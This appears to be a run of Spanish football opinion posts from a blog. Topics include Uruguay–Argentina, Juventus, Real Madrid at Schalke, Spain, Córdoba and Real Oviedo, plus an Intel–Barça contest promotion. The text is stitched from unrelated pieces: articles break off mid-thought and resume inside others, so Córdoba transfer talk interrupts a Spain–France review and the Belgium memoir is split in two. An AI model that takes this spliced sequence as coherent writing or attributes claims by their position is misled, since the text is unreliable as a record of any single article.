charrúas, históricos dominadores del torneo, trasciende siempre a lo meramente deportivo. El primer partido en la historia de ambas selecciones nacionales fue, precisamente, un Uruguay-Argentina, perdido en la noche de los tiempos allá por el año 1901. Desde aquella lejana fecha, el historial de enfrentamientos entre los dos vecinos, que deja un total de 178 encuentros, ha dejado un reguero de historias, anécdotas y acontecimientos marcados siempre por una incuestionable rivalidad. Aunque lejos quedan ya los encarnizados duelos de principios del siglo XX, marcados por un ardor competitivo y una fiereza fuera de lo común, el clásico rioplatense no entiende de estados de forma ni de ánimos. Representa, como pocos partidos entre combinados nacionales en el mundo, la necesidad de exhibirse y mostrarse superior al vecino.Y no, no es que Benzema me disguste pero desde esta mañana respeto un poco más al argentino. 1972. En la enfermería del Liverpool Bill Shankly desestima la contratación del genio que borda el fútbol todos los domingos para el Leicester. Hace medio mes le pidió que se lo tomara con calma unos días, aquella tensión arterial era más propia de un drogadicto que de un profesional de la pelotita, antes de volver a pasar el reconocimiento médico. El tipo le hizo caso, se ha largado a Mallorca de fiesta y ha vuelto más perjudicado que la primera vez.1979. Tac, tac, tac. Tres toquecitos como en la calle, un sombrero de espaldas y el hasta luego a medio equipo rival antes del zurdazo inalcanzable al rincón derecho. La defensa del Ipswich solo puede hacer lo mismo que el resto aquella tarde en Burnden Park, lo mismito que Shankly hace siete años, abrir la boca ante la última ocurrencia de Frank Worthington.Casi 300 goles, 26 años de carrera y 24 equipos en la hoja de servicios. Como Le Tissier, alguna que otra convocatoria con una nacional que huye del talento anómalo. Amor por el fútbol. “George Best no era el único que tenía buena reputación con las mujeres. En mi libro cuento como me las arreglé para engatusar a una adolescente sueca y a su madre. Fueron grandes días” Rock and roll, la obsesión por Elvis, los coches rápidos y la buena vida” Justo en el día en que Enric González nos recuerda que en al fútbol le han extirpado el romanticismo me ha apetecido hablar de Frank Worthington. Están de moda los memes de Julio Iglesias y entre la sartenada de ocurrencias hay uno que le sienta como un guante a la Juventus. Es el que enseña al titán de la canción ligera, bronceado hasta límites aborígenes, invitando al escenario a alguna aficionada a la voz de “sube que te folle” Cambien la planta del galán por una foto del once juventino y tendrán la realidad brutal del fútbol italiano. La Juventus ha arrancado este curso exactamente igual que terminó el anterior. La víctima fue la Lazio, un buen equipo sobre todo en el centro del campo, que se llevó un 4-0 inapelable. En la grada del Olímpico, entre los coros racistas de los mismos imbéciles de siempre, me pareció escuchar ‘La vida sigue igual’ en la garganta inconfundible de Julio…A la nueva Juventus, que comenzó tácticamente idéntica a la de la temporada pasada con la única novedad de Tévez para acompañar a Vucinic, le costó entrar en juego y despachó 15 o 20 minutos de imprecisión en la circulación pero sigue teniendo el don de ganar los partidos locales a poco que apriete el acelerador. Será así en Italia, es la pinta, y falta ver si la receta alcanza para la Champions. La Lazio, que cuenta con una medular más que interesante, intentó presionar a Pirlo a través de Hernanes pero el inventó saltó por los aires pronto por el ímpetu descontrolado de este brasileño irregular. Tan solo Candreva mostró talento y voluntad por la banda derecha. Demasiado poco para disputarle nada al campeón.La Juve, que entrenó en Trigoria por cortesía de la Roma en una decisión de los romanos que ha traído abundante polémica en la capital, hizo del Olímpico su casa. El dominio fue tal que tan solo faltó pintar los asientos de negro y blanco.No jugó Fernando Llorente pero sí Tévez, que hizo un gol y sacó adelante un partido incómodo. Fue una faena de fajador, en la que tuvo que pelearse con una defensa romana demasiado violenta en determinadas ocasiones y contra las dificultades propias de la adaptación al sistema. Con todo, se vio un Apache implicado que apunta a titularísimo. Con la incorporación del español y el argentino, la Juventus experimentará un salto de calidad extraordinario en ataque por más que ni uno ni otro sean matadores de abultadísimas cifras. ¿Será suficiente para tirar del carro en Europa? Es la única duda que inquieta a la parroquia blanquinegra.El resto son certezas, una tras otra.El ansia por el orgullo y la preeminencia futbolística, en dos países donde el fútbol es religión y motivo de vida.Escribió cierta ocasión el siempre oportuno Eduardo Galeano, acerca de ese seleccionado celeste que tanto le emociona, que ‘si los uruguayos aprendiesen de la Historia, todo bien; pero no: el aficionado charrúa se refugia en la nostalgia cuando siente que le abandona la esperanza, porque la esperanza exige audacia y la nostalgia no exige nada‘. Porque a Uruguay siempre le han pesado sus éxitos de hemeroteca. Es lógico. Las exigencias históricas de una selección bicampeona del mundo, quince veces campeona de la Copa América (la última en 2011) y doble medalla de oro olímpica deden ser abrumadoras, por mucho que su presente sea más bien grisáceo. El caso es que de esos diecinueve títulos, sólo seis (seis Copas América) se consiguieron en los últimos sesenta años. Hay generaciones y generaciones de aficionados uruguayos que veneran el ‘Maracanazo’ de 1950. Que idolatran a los Fernández, Cea, Dorado e Iriarte y tienen en un pedestal al ‘Negro Jefe’ Obdulio Varela, a Pepe Schiaffino y a Alcides Ghiggia, pero que sólo conocen de ellos por referencias paternas o por viejos almanaques. Son los ‘refugiados en la nostalgia’, a los que se refería con acierto Galeano, precisamente uno de los suyos.El duelo ante la Argentina del inconmesurable Leo Messi, cuyo sprint final de temporada le emboca directamente hacia el éxito en Chile, se presenta como una oportunidad ideal para refrendar lo que en este último lustro viene apuntando la selección hoy comandada por Edinson Cavani. Semifinalista en una Copa del Mundo cuarenta años después, y nuevamente campeona de América, Uruguay vino a anunciar al mundo que ya no le pesa haber sido dominador mundial a principios del siglo XX y que ya ha decidido no refugiarse en la nostalgia, como criticaba Galeano, sino abastecer su esperanza de audacia y decirse a sí misma que por qué no. Que una generación brillante como la de Cavani, Suárez o Godín no merece pasar por la historia del fútbol sin dejar huella.Francescoli, Recoba, Bengoechea, Poyet, Rubén Sosa… Los enormes talentos surgidos con cuentagotas y por generación espontánea que durante años fueron el sustento del combinado charrúa han dado paso a un equipo sólido, con figuras formadas en Europa y en los que el bloque prima sobre las genialidades de uno o dos iluminados. Es una selección que aspira a seguir creciendo, a seguir sentando las bases para un futuro ilusionante, a demostrar que lo de Sudáfrica y lo de Argentina no fue un mero espejismo.Puedes comprar camisetas de Uruguay y de Argentina en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Cuando un equipo de fútbol consigue la proeza de colocarse con una ventaja de dos goles a cero en campo contrario, lo normal, lo que la naturaleza humana invita a hacer, es que se quede resguardadito y tranquilo en torno a su área. Como quien ya ha hecho sus deberes y se puede limitar a observar, no sin cierto componente de regocijo, como los demás se apuran para terminar los suyos a tiempo. Si tal proeza se consigue en el partido de ida de una eliminatoria a doble encuentro, las probabilidades de retirarse del campo de batalla antes del pitido final se multiplican. Si además de todo ello, la hazaña tiene lugar en territorio alemán y en un partido de competición europea, no guarecerse en el resultado favorable tempranero puede tener una doble y muy dispar lectura: o todo responde a una osadía tendente al suicidio, o el peso de la autoconfianza es tal que en tu naturaleza no existe el concepto del riesgo.Anoche el Real Madrid consiguió adelantarse, con toda justicia, por cero goles a dos en el marcador del Veltins Arena. Habían transcurrido únicamente veinte minutos de partido. Es decir, la situación ideal para que cualquier equipo en su sano juicio hubiese decidido dar el partido por finiquitado pensando en un partido de vuelta en casa ciertamente plácido. Pero este Real Madrid tiene un punto de locura maravillosa. De ese tipo de locura que le lleva a uno a actuar sin detenerse a pensar en las consecuencias posibles de sus actos. O eso, o es que es tan consciente de la superioridad que escupe la realidad de sus enfrentamientos con otros equipos, que ni siquiera concibe el peligro. Ni siquiera Ancelotti, que huye de esa tendencia tan de ocupante de banquillo de contemporizar y reservar fuerzas, se ve con autoridad moral suficiente como para sujetar las riendas de su equipo desatado y hacerle morder bocado para frenar su ímpetu.Cuando anoche el Real Madrid anotó el segundo de sus seis goles al Schalke todos previmos que la cifra no se iba a quedar ahí. A nadie se le ocurrió pensar que ese ya de por sí estupendo resultado, dadas las circunstancias del partido en cuestión, iba a ser suficiente para satisfacer la voracidad madridista. Todos intuimos de inmediato un marcador abultado, tal vez histórico. Cuatro, cinco, seis goles en territorio tradicionalmente hostil y poco dado a las alegrías blancas. Y sin ruido, sin mayores estridencias, sin crear un conflicto innecesario en cada acción. Sin plantear la batalla como una guerra de guerrillas. Combinando un compromiso con la causa casi funcionarial con una explosividad, una sinceridad y una belleza plástica digna de cualquier interpretación artística improvisada. El Madrid ejecutó anoche al Null Vier en una Jam Session futbolística, donde cada participante en la exhibición aportaba lo mejor de sí para regocijo del colectivo. Demostrando que cuando un equipo que alinea en su frente de ataque a Cristiano, Benzema o Bale, bigoleadores cada uno de ellos en la noche de Gelsenkirchen, pone su foco sobre el césped y no sobre el banquillo, el resultado solo puede ser favorable. Desde que España enterró bajo diez metros de hormigón todos viejos sus fantasmas, en aquella noche de julio sobre el Prater de Viena, los antaño insípidos amistosos que rellenaban el calendario internacional enfrentándonos a selecciones de segunda fila comenzaron a perder su carácter de amistoso sin nada en juego. Uno se acostumbra rápido a la victoria y, cuando la prueba, no quiere otro sabor que no sea el dulce del éxito. A España le empezamos a exigir lo que nunca jamás se nos habría ocurrido exigirle, sin margen para el fallo y dando siempre lo máximo de sí. Había que vencer, y convencer, hasta en los amistosos.Nunca habría dejado de hacer lo que en ese momento estuviera haciendo para ver un amistoso de España antes del logro de 2008. Pero ahora las cosas son diferentes, porque vencer a los gigantes del fútbol mundial ha dejado de ser una anécdota. Apetece ver a España. Y esta afirmación, que ahora mismo pudiera parecer chocante, parecía utópica a mediados de la pasada década, cuando caíamos en Belfast y empatábamos sin goles en Reikiavik. Había especial interés, además, por ver esta reaparición de la nacional tras la consumada debacle del pasado Mundial. El reciente adiós de varios pesos pesados sobre los que se cimentaron los éxitos pasados hacía del partido ante Francia una ocasión especial. ¿Podría sobreponerse España a la salida simultánea de varias de sus referencias? ¿Acusaría la sensación de orfandad? ¿Estarían los sustitutos de los ausentes a la altura de lo esperado?Por lo visto en la primera mitad de Saint-Denis, España sí que ha asumido el necesario giro de tuerca. La transformación puede personificarse en Cesc Fàbregas, un futbolista que ha multiplicado su presencia en el desarrollo del fútbol del equipo y que, liberado por fin de la alargada sombra de Xavi Hernández (y, por qué no, de Xabi Alonso), ha ganado en trascendencia en un equipo que le tenía confinado para misiones que no eran la suya. Su actitud, junto con la del resto de debutantes, fue notable. Empezando por David de Gea, sorprendente ocupante de la portería española durante los noventa minutos, y terminando por Paco Alcácer, el último en estrenarse.Sin embargo, y pese a la buena actitud exhibida durante el choque, a España se le siguen adivinando los mismos vicios que antaño. Mucho olfateo a la presa y poca dentellada. Excesiva elaboración y descuidada ejecución. España sigue echando en falta la misma escasa capacidad de mordiente de la que hizo gala en el pasado Mundial. Mientras no se sabe muy bien si intentamos adecuar el juego del equipo al de Diego Costa o el del hispanobrasileño al del equipo, la sensación de inoperancia ofensiva es exasperante. España sigue apareciendo como un equipo romo, con no excesivos problemas para adueñarse de la pelota pero con un galimatías considerable en cuanto llega el momento de aproximarse al área rival. España es un insuperable seductor que se viene abajo en el peor momento víctima de un gatillazo demoledor. Por encima de nuevas caras, por encima de nuevos roles y mejoradas actitudes, el problema sigue identificado y sin solución aparente.Y de momento Gálvez no puede arreglar el desaguisado de la defensa cuando faltan los titulares, ni De Tomás está aportando nada en ataque, ni López Silva es un verdadero recambio en las alas del campo. Eso sin contar con un Pineda perdido para la causa o a un Dalmau muy inseguro cuando ha tenido que saltar al campo. ¿Qué necesita el Córdoba? Seguro un delantero. Se ha ido Arturo y De Tomás no es competencia. Florín es internacional con Rumanía y aún le quedan unas cuantas ausencias por sus citas internacionales. Además ese runrún de que llegados a un hipotético playoff de ascenso, el delantero franquicia podría estar convocado para la Eurocopa y ser baja para la segunda eliminatoria, de producirse.Seguro un defensa. A ser posible con capacidad para ser central y lateral derecho. Si falla Cisma está Abel con solvencia. Pero si no están Deivid o Rodas, Gálvez ha demostrado no estar familiarizado con el puesto. Muchas lagunas atrás que se han contado casi todas con puntos perdidos. Y si no está Stankevicius, que haya más alternativa que un Dalmau perdido en el campo cada vez que juega. Si mejora su rendimiento, Dalmau es una opción. Pero hoy por hoy, demasiado peligro en una posición por la que han entrado varios goles esta temporada.El centro del campo con Gálvez, Luso, Víctor, Markovic y Caballero parece apuntalado. En las bandas Pedro Ríos, Nando, Fidel, López Silva y Pineda –aunque estos dos valgan por uno-; podrían valer para pasar el año.Lo demás es más parte de la corteza cerebral del equipo, no del músculo. El Córdoba acusa las bajas, es una realidad. El equipo blanquiverde tiene un once muy consistente que pierde pie con facilidad cuando alguno de los intocables está ausente, cosa lógica en una competición extenuante como la Liga Adelante.Que sean nombres de peso o no lo sean, casi me da igual. Emilio Vega ha demostrado solvencia este año y con un presupuesto de andar por casa ha confeccionado una plantilla a la que Oltra ha sobredimensionado. Melones, aunque salga apepinados, que alimenten un banquillo enclenque cuando se acumulan lesionados y apercibidos.Neville tiene razón en parte: los fichajes de invierno despistan a los jugadores y se compra casi al azar, como en el Corte Inglés el 5 de enero a las nueve de la noche. El Córdoba ha demostrado tener plantilla para pelear por el ascenso. Tiene ganas de comer, pero no hambre. Estaría bien fichar, pero no es una locura no hacerlo. Lo que venga tiene que sumar, y no sólo hablo de fútbol, hablo de equilibrio en el vestuario, de mentalidad ganadora, de ese buen ambiente que intuimos intramuros.Suena Molina, con ganas de jugar y que dudo que abandone el Betis para, de primeras, ser tercer delantero tras Florín y Xisco. Suena Tighadouini, extremo marroquí pasado de peso y sin apenas minutos en el Málaga de Gracia. Y luego lo de siempre, ese tipo de fichaje emocional del Córdoba: Fuentes. Que no cuenta para el Espanyol y está buscando salida. O Fernández, entendiendo que el lateral, al que Johannesson le ha comido la tostada, quiera moverse del Oviedo. Aunque tras el affaire veraniego, difícil que tenga las puertas abiertas para una posible repatriación.Alternativas hay muchas. Días muy pocos. Huecos que cubrir, apenas dos. Contra el Leganés el Córdoba saldrá con lo que tiene. Es buena oportunidad para que De Tomás marque, Caballero se entone y Dalmau centre alguna. Lo digo por si finalmente no fichamos, como amenazó el Presidente, y el domingo se nos viene el techo encima. Yo ni perdono ni olvido, tan sólo disimulo. Empieza el Mundial y quiero pensar en cosas tristes. El cielo está hoy del gris de las cajas de pescado. Húmedo y siniestro. No estoy ilusionado con España. Ganar dos mundiales es una esperanza que sólo nos conduce a la tristeza. Podría decir, con una boca pequeña, que no tengo ganas de fútbol. Que no quiero ver como otros nos quitan la Copa que llevamos cuatro años custodiando. De todos mis recuerdos dolorosos, de toda la memoria que me acuchilla, recuerdo a la Bélgica de Mexico 86.La inteligencia de Andrea Pirlo para la dirección y el balón parado sigue intacta, de una ocurrencia suya nació el 1-0 de Pogba a pase del siempre punzante Lichsteiner. Ahí está la defensa ya clásica con un Chiellini imponente, ahí Vidal ligando todas las salsas y ahí está Pogba, aprovechando la lesión del ‘Principino’ Marchisio (cinco semanas tras dañarse la rodilla en una acción con Radu) para reclamar galones (y seguramente un blindaje contractual) Año nuevo y vida nueva en Italia pero Conte y los chavales siguen invitando al resto a subir al escenario. Ya saben lo que les toca.Foto: Juventus Este texto está extraído del libro ‘Un derbi solidario’, en el que 46 periodistas  aportamos 46 relatos sobre el Real Oviedo y el Sporting de Gijón. Los beneficios de este libro, 10 euros por ejemplar, se destinan íntegramente a Adansi, la Asociación de Autistas “Niños Del Silencio”No se me ocurrió la metáfora mientras volvíamos en el AVE Toledo-Madrid, con los playeros de lona calados hasta los calcetos y la sonrisa de oreja a oreja, pero aquello en el Salto del Caballo bien me la podría haber metido en la cabeza. La nieve sucia sigue siendo nieve. Cualquiera que sepa el significado de palabras ignotas como Vojvodina, Chapacú o jorobu comprende que ser del Oviedo obliga a tener paciencia. Toca es esperar el momento, olerlo y  agarrarlo en cuanto pase porque nunca sabes cuanto tiempo transcurrirá antes de que la vuelvas a ver tan gorda. Aquellos dos partidos de invierno en Toledo fueron preciosos para el que supo disfrutarlos. Torcimos por la esquina de una calle milenaria y en un templo del ‘under’ español topamos con la épica, aunque fuera de andar por casa. Era 2010 y sucedió porque la nieve sucia sigue siendo nieve.Muchas veces me tocó seguir al equipo fuera de casa, por una razón u otra. Todavía recuerdo la remontada en San Mamés con Onopko de pulpo, el Tito Pompei repartiendo rosquillas y Dely con el teléfono móvil preparado en la banda. Yo estudiaba la carera de periodismo en Bilbao y como el presupuesto no me daba para la entrada tuve que ver el partido en un mesón 100% rojiblanco. Celebré aquellos cinco goles con la felicidad que solo puede sentir un universitario harto de botellines y con su equipo en Primera división. El Oviedo arrasaba y yo estaba más contento que un perro con dos colas. No tenía preocupaciones en la vida, ni se me había pasado por la cabeza que la morralla me esperaba a la vuelta de la esquina.Más de diez años después, lo de Toledo llevó al paroxismo el concepto de infrafútbol. Claro que si tienes el cerebro hecho una mierda a base de carruseles deportivos y sesiones de PC Fútbol lo de ir al Salto del Caballo tiene que ilusionarte por fuerza. Y en esas estábamos Granda y yo. Mi colega y compañero incondicional de grada, el día antes del partido. De camino y durante toda la noche que, perdón por el chiste, fue bastante toledana, nos acordamos del Toledo cepillándose al Madrid en Copa cuando Del Bosque todavía palmaba algún partido o de que por allí habían pasado grandes como Luis Manuel o el ‘Chino’ Losada. Si hasta recordamos a Cidoncha con el cariño que se le reserva a los cromos verdaderamente míticos…Ya en Toledo y según avanzaba el día, el guión iba encajándose para formar una pieza memorable. No sabíamos como iba a acabar aquello pero hasta el más tonto podía notar que algo se estaba cociendo. Con un frío de los que duelen, incluso para un asturiano acostumbrado a mojar los calcaños en traicioneras y capitalinas baldosas, entramos al primer bar que vimos y lo que encontramos, además de cuatro cañas que resultaron pura salud, fue un contingente de oviedistas de los que te arreglan el viaje. De repente hubo justificación a la pijada de ir a Toledo a papar frío y buscar una victoria incierta. Fue como si Google Maps nos hubiera tirado una flecha imaginaria a la cabeza y nos hubiera puesto en el mapa.Yo era demasiado pequeño, pero tenía la edad suficiente para que mi corazón hiciera crac. La razón se estaba gestando pero el fútbol ya me hablaba con palabras adultas. Después vino Italia. Luego Nigeria. Corea. Francia. Pero tras el 5 a 1 a Dinamarca España soñaba con algo importante.Todos los recuerdos infantiles empiezan en el salón de casa. En un sofá de escay. Con padres y abuelos, con algún hermano o hermana –en mi caso-, en una calurosa tarde de verano. No recuerdo ver el partido. No sé si era de día o de noche, no sé quien estaba a mi lado. Sólo sé que perdimos y que Eloy falló un penalti. Recuerdo a los belgas tan felices, tan insoportablemente felices, que no pude contener las lágrimas. La tristeza infantil es sagrada. El odio es un juguete.Alguien nos hizo creer que criticar a nuestro equipo, sacar a la luz sus defectos y recordar sus carencias nos convertía de facto en peores seguidores. En infieles, en interesados y en protagonistas de un matrimonio de conveniencia en el que nuestro amor parecía funcionar únicamente cuando las cosas venían rodadas y las veladas románticas parecían no tener fin. Puede que de ahí surgiera ese ‘miedo’ que parece existir en Bilbao a hablar del Athletic Club si no es en tono elogioso. El fuerte arraigo del sentimiento de fidelidad a los colores conlleva a veces cierta pérdida del espíritu de crítica. Como si por el simple hecho de dejar de manifiesto tu descontento implicara un menoscabo en la indudable estima hacia tu equipo.El Athletic no está bien. Y no lo está porque se le ha encomendado una tarea para la que ni tiene medios apropiados ni está convenientemente preparado. Como si alguien le hubiese mandado apagar un incendio forestal de trescientas hectáreas con una regadera. El equipo se ha visto de la noche a la mañana convertido en un director de un circo de dos pistas (tres, si contamos la Copa), cuando a duras penas conseguía mantener el orden en una sola. No ha sido algo imprevisto, desde luego, porque ejemplos similares recientes hacían presagiar un devenir incierto en la temporada en la que el club debía compaginar la exigencia y la tensión de la ilusionante Liga de Campeones con las obligaciones ligueras cotidianas.La angustiosa sensación es la de que el equipo de Valverde, con una plantilla considerablemente corta, no solo se ha visto sobrepasado por la situación desde un punto de vista de rendimiento físico, algo fácilmente previsible, sino que además se encuentra bajo la dominación de un bloqueo mental que apareció casi como consecuencia inmediata a la borrachera que supuso la eliminación del Nápoles en la ronda previa y que ha devenido en un record negativo con casi veinte años de vigencia: el Athletic acumula tres partidos consecutivos en San Mamés sin anotar un solo gol. Algo que no se recordaba desde la época (aciaga) de Stepanovic. Para que los más veteranos del lugar puedan trazar la pertinente comparación.Y la europea visita a Borisov, que en principio pudiera ser vista como un partido con efectos balsámicos dada la escasa entidad del BATE, encierra un peligro latente. Un riesgo de recibir la penúltima bofetada en todos los morros, la que te deja tiritando y con un molesto pitido en el oído. Entregado hasta recibir el definitivo guantazo de gracia el próximo domingo en el Bernabéu, escenario idóneo para profundizar en la herida abierta. Dice Muniain que no nos preocupemos. Que no hay motivos para alarmarse por la situación actual del equipo. Es el sino del hincha del Athletic moderno. Conformarse. Asumir con estoicidad apoyado en el ‘Beti zurekin‘. Y no alarmarse jamás. Intel, aliado oficial del FC Barcelona, comparte una serie de características comunes con el club azulgrana. El orgullo, la determinación, la pasión y la alegría por su trabajo son demoninador común en el día a día de Intel y el Barça. Por eso, resultaba inevitable que los caminos de ambos acabasen confluyendo. ¿Te gustaría poder disfrutar de la posibilidad de jugar un partido en el Camp Nou y vivir una experiencia inolvidable? Pues ahora, y gracias al acuerdo alcanzado entre Intel y el FC Barcelona, esa posibilidad está a tu alcance. Intel regala TRES VIAJES EXCLUSIVOS A BARCELONA para poder vivir la experiencia que cualquier aficionado al fútbol querría vivir.Para participar en el concurso, puedes hacerlo a través de Facebook o a través de Twitter. Debes publicar un selfie con el que demuestres que compartes los valores de Intel y el FC Barcelona, bien en Twitter empleando el hashtag #LookInsideFCB (la foto se cargará automáticamente en la app de Facebook) o bien de manera directa a través de la propia app de Facebook del concurso. De entre las fotos más votadas por los usuarios que sumen diez o más votos, un jurado de Intel seleccionará a tres ganadores.Bases de la promoción. Fue en el golpeo de un libre directo. Escaso de fuerza pero con cierta colocación, Víctor simplemente tuvo que saltar ligeramente hacia atrás para detener la trayectoria de un balón relativamente manso. Fue ese maldito gesto, ese saltito hacia atrás y no hacia el frente, el que probablemente le hizo perder la referencia de la batida y de la posterior pisada y el que le hizo tomar tierra ligeramente desestabilizado. Lo suficiente para que el ligamento cruzado posterior de su rodilla derecha no resistiese la absorción del impacto en la recepción de la caída. Como una cuerda de guitarra excesivamente tensada, las fibras ligamentosas restallaron en la rodilla del meta azulgrana.Desde aquel día juré venganza. Ni siquiera la victoria de Argentina en siguiente ronda me calmó. Pasó el tiempo pero no pasó nada. España nunca pudo limpiar aquella eliminatoria. El dolor quedó ahí, encapsulado y solo. Ganamos un Mundial. Para algunos es suficiente, para el recuerdo de un niño hecho pedazos no lo es en absoluto. Siempre odié a Bélgica y ahora que presentan a una Selección de calidad aún más.Qué risa con los hermanos Mpenza. El tiempo nos ha tratado diferente. España es ahora mejor, ahora somos ganadores y ellos una esperanza excéntrica. Me escribió Marisa el otro día, que vive en Bruselas, y me dijo: aquí todos llevan el pelo como Fellaini. Con Hazard, que es mágico, con Defour, Lukaku, Kompany.Qué ganas de ganarles, de devolverles trozo a trozo aquel dolor minúsculo del 86. Aquella pesadilla de verano. Y luego está Courtois, que me hace recordar a mi portero preferido de siempre, Preud´homme. Y a Pfaff, que nos quitó tanto en México. Se me atora la garganta de recordarlo con la Adidas azul listada en diagonal. Pregunté en Twitter y es imposible cruzárnoslos en cuartos. Sería demasiado poético. Sería tan hermoso que es casi impropio del fútbol. En la final, quizá, pero dudo que estemos ninguno de los dos allí.Empieza el Mundial y me entretengo en la anécdota por no entrar en lo importante. El viernes estaremos frente a Holanda. Y yo pienso en Bélgica. El fútbol, como la vida, nos lleva por caminos raros. Escucho a Quique González para empezar la mañana. Haré tiempo mientras rueda el balón. El balón que busca, como un perro en un descampado, nuevas historias, pequeñas venganzas, miedo primero. Nos pasamos la vida alabando los valores y la filosofía del fútbol inglés y a las primeras de cambio pedimos que se carguen a nuestro entrenador. Aquí estamos, en España, echándonos las manos a la cabeza. Recorriendo los vomitorios como nazarenos blanquiverdes. Si no hay papel higiénico, nos limpiamos el culo con el material con el que se fabrican los sueños. Los hamsters se comen a sus crías y los cordobesistas nos comemos nuestras ilusiones. Pasión infinita, pero hasta cierto punto. Seis derrotas en casa son muchas derrotas, es cierto. Pero, ¿qué opciones manejamos? ¿A dónde queremos ir? ¿A qué vamos a jugar?Oltra estaba en el cadalso. Un entrenador que había cogido a un equipo deshecho y sin rumbo, que había recompuesto a jugadores que en Primera habían reventado en mil pedazos. En un club con un presidente apático y sensacionalista, un Carpanta de los despachos que con cuatro duros y el sin vivir de Emilio Vega, había confeccionado una plantilla limitada y enigmática.Oltra, que había hecho sólida una casita hecha de paja. Que había recuperado a Xisco para la causa, que había dormido en puestos de ascenso directo o playoff casi todas las noches en lo que va de temporada. Un entrenador que se había alejado del descenso, que había evitado esa senda tantas veces transitada que emparenta la Primera con la Segunda B, un camino que habían recorrido Burgos, Cádiz, Rayo, Tenerife o Albacete.El fútbol es irracional. Por ejemplo, si estamos en casa y el frigorífico hace escarcha y es ruidoso, jamás se nos ocurriría tirarlo al contenedor sin haber buscado un recambio antes. Si no tenemos dinero, nos conformamos con la nevera vieja, que al menos enfría. Nos puede pasar que cambiemos el electrodoméstico por un cubo de lata lleno de hielos. Se pedía el cese de Oltra sin saber si la directiva iba a gastar dinero en un nuevo técnico o si iba a mirar en El Corte Inglés de Oportunidades en busca de un míster raquítico cogido casi al azar.La última vez que el Córdoba pudo gastarse el dinero, no lo hizo. En Navidad las cosas venían de cara y se veía que en algunas líneas hacía falta sangre nueva. Era un pequeño empujoncito para mantener la buena línea, para amoldar el equipo a los nuevos objetivos: el ascenso. Entonces el presidente dijo que no hacía falta y vino Eddy Silvestre a cubrir la única zona que no necesitaba renovarse: el centro del campo.El tiempo confirmó lo que se sospechaba: la plantilla era corta, la defensa demasiado veterana y ni Pineda ni De Tomás funcionaban arriba. La racha de derrotas era consecuencia de un equipo exigido, que desfallecía tras la acumulación de partidos, que perdía ante equipos reforzados y más potentes que en la primera vuelta.Oltra hizo experimentos con gaseosa. Sabedor de que la temporada sería larga se propuso arreglar el frigorífico por sí mismo utilizando las piezas que tenía en casa. Subió a Bijimine y a Moha e hizo fijo a Abel Moreno. Los del filial rindieron menos que más. Oltra adaptó el sistema pensando en las nuevas piezas. Bajó las frigorías de la nevera y cambió las baldas de sitio.Calientes y centrados ya, tiramos para el campo.No miento si reconozco que de aquel primer encuentro en Toledo recuerdo pocas cosas cuando pienso en lo que sucedió en el prado. El gol de Manu Busto, sí, con un pase a botepronto de Jandro que andaba jugando de delantero y  no era ya el Jandro de la camiseta 7 que yo había comprado con toda la ilusión del mundo en Tercera. Recuerdo a la afición local decidiendo que el calificativo idóneo para Miguel por recibir doble amarilla tras tirarse dos veces era el de tooonto (así, con triple o) y que los cuatrocientos oviedistas que estábamos allí secundamos el cántico. Las aficiones son muy cabronas y la nuestra también, aunque tenga más ramalazos de lucidez que la mayoría. Recuerdo la astracanada por el cambio de Rayco y a un paisano comentando ‘viva voce’ sobre Rubén García mientras trataba de esprintar, ¡No me jodas chico si Rubén García corre p’atrás! Pero eso ya entra dentro del terreno del humor y yo estaba hablando de la épica. Aunque sea de andar por casa.Nevaba con gracia en el municipal toledano. Yo miraba a alguno de la Peña Azul Madrid, la camiseta en la mano, los copos en el pecho y las copas en la sangre y pensaba, esta gente es grande. Nevó y nevó hasta que el árbitro dijo que allí no se podía jugar salvo que el delegado sacara el balón de colorines y volviera a pintar unas líneas que ninguno habíamos vuelto a ver desde hace rato. No os imagináis el mosqueo del respetable astur cuando al colegiado le dio por bajar la persiana. Los del césped embarrado cada domingo en Buenavista queríamos jugar aquel partido, bramamos por no poder hacerlo, inconscientes de que jugándolo no hubiéramos perdido una historia de fútbol memorable. Una de esas que le podrías contar a tus nietos cuando ya no haya estadios de fútbol y cuando lo del cemento y las palmas suene a batallas ajadas. Los 45 minutos aplazados de Toledo. ¿Os imagináis el sentimiento de orgullo que supone escapar del trabajo corriendo, agarrar un tren y luego un taxi para llegar tarde a los 45 minutos aplazados de un partido de mierda y que al entrar al campo te encuentres de nuevo a los tuyos animando en la grada? Yo creo que no os hacéis una idea. Sufrimos como perros aquel día para aguantar un 0-1 que al final no sirvió para mucho porque aquel año no conseguimos escapar de los barrizales. En otro día asqueroso para pasear, el fútbol tampoco acompañaba. La pelota no nos duraba y el sistema tenía más agua que los playeros que ya comenzaban a helarme los pies como cada vez que voy a ver al Oviedo. Pero ganamos y eso nos valía. El equipo transpiraba aquello de lo orgullo valor y garra y la comunión fue total. La grada en la brecha y el equipo también. Celebramos aquellos tres puntos como si fuéramos el Toledo mojándole la oreja al Madrid.No hubo tiempo para dudas cuando Valdés se tiró al suelo y lanzó la pelota fuera entre desesperados gestos de dolor. Se había roto.Los dos o tres minutos que transcurrieron entre la primera exploración sobre el césped y el posterior traslado del portero de L’Hospitalet en camilla parecieron eternos. Más que suficientes para asimilar que el mejor portero de la historia del FC Barcelona acababa de rendir su último servicio como azulgrana. Que, si los acontecimientos se suceden como está previsto desde meses atrás, Víctor Valdés no volvería a saltar a un terreno de juego defendiendo el escudo barcelonista. Que aquellas lágrimas que apenas podía contener y que se le escapaban entre los guantes serían el último triste recuerdo que su afición guardaría de él.No soy aficionado culé y tampoco es que me una una especial simpatía por los colores azul y grana. Pero sé reconocer cuando estoy ante una leyenda o ante una referencia histórica. La trascendencia de Valdés en la historia del club solo podrá ser calibrada a través del vacío que dejará en la portería. O, mejor dicho, del que ya ha empezado a dejar. Un silencio entre tenebroso y melancólico se adueñó anoche del Camp Nou cuando ese dichoso ligamento decidió acaparar protagonismo en una fiesta a la que no había sido invitado. Víctor, aquel portero que con dieciocho años aún no tenía claro si quería vivir del fútbol pese a sus inmejorables condiciones técnicas y su prometedor futuro, seguramente habría imaginado otro epitafio a veintidós años de entrega barcelonista. De repente, su vida, dispuesta a encarar un futuro inmediato aparentemente incierto, dio un giro inesperado. Cruel. En una noche aparentemente plácida pero que terminó marcando para siempre a toda una generación de seguidores azulgranas. Cuando Ronaldo de Assis Moreira tomó la decisión de abandonar el fútbol europeo, dar un portazo a su salida del Milan y embarcarse en el primer vuelo disponible con rumbo a casa, muchos vimos aquella maniobra del Gaúcho como una retirada hacia una vida más sosegada, lejos de la extrema competición diaria y alejado de la presión de la luz de los focos. Lo que quizá no 